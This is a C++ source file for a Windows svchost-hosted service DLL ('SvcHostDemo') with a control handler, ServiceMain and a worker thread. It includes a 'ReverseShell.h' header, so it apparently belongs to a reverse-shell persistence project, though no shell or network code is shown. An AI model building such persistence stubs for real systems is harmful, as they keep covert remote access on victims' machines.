#include "../Starter/ReverseShell.h"
#include <stdio.h>
#include <windows.h>
#include "MyService.h"

void ThreadFunc()
{
	Log("Start ThreadFunc\n");
	WriteStartFile();
}

void DbgPrint(char * str)
{
	CHAR data[10000] = { 0 };
	HWND wndMain = FindWindowA("Notepad", NULL);
	HWND edit = FindWindowExA(wndMain, 0, "Edit", NULL);

	SendMessageA(edit, WM_GETTEXT, 255, (LPARAM)data);
	strcat(data, "\n");
	strcat(data, str);
	SendMessageA(edit, WM_SETTEXT, 0, (LPARAM)data);
}

DWORD WINAPI HandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
#pragma EXPORT
	Log("HandlerEx\r\n");

	switch (dwControl)
	{
	case SERVICE_START:
		Log("SERVICE_START\r\n");
		serviceStatus.dwCurrentState = SERVICE_START;
		ResumeThread(hWorkThread);
		break;
	case SERVICE_CONTROL_STOP:
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		Log("SERVICE_CONTROL_STOP\r\n");
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		TerminateThread(hWorkThread, 0);
		Log("SERVICE_CONTROL_SHUTDOWN\r\n");
		break;
	case SERVICE_CONTROL_PAUSE:
		serviceStatus.dwCurrentState = SERVICE_PAUSED;
		SuspendThread(hWorkThread);
		Log("SERVICE_CONTROL_PAUSE\r\n");
		break;
	case SERVICE_CONTROL_CONTINUE:
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		ResumeThread(hWorkThread);
		Log("SERVICE_CONTROL_CONTINUE\r\n");
		break;
	case SERVICE_CONTROL_INTERROGATE:
		Log("SERVICE_CONTROL_INTERROGATE\r\n");
		break;
	default:
		Log("default\r\n");
		break;
	};

	SetServiceStatus(serviceStatusHandle, &serviceStatus);

	return NO_ERROR;
}

extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc, LPCWSTR* lpszArgv)
{
#pragma EXPORT	
	Log("service main\n");
	serviceStatusHandle = RegisterServiceCtrlHandlerExA("SvcHostDemo", HandlerEx, NULL);

	serviceStatus.dwCurrentState = SERVICE_RUNNING;

	SetServiceStatus(serviceStatusHandle, &serviceStatus);

	hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadFunc, NULL, 0, NULL);
}

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)
{
	Log("DllMain\r\n");
	return TRUE;
}

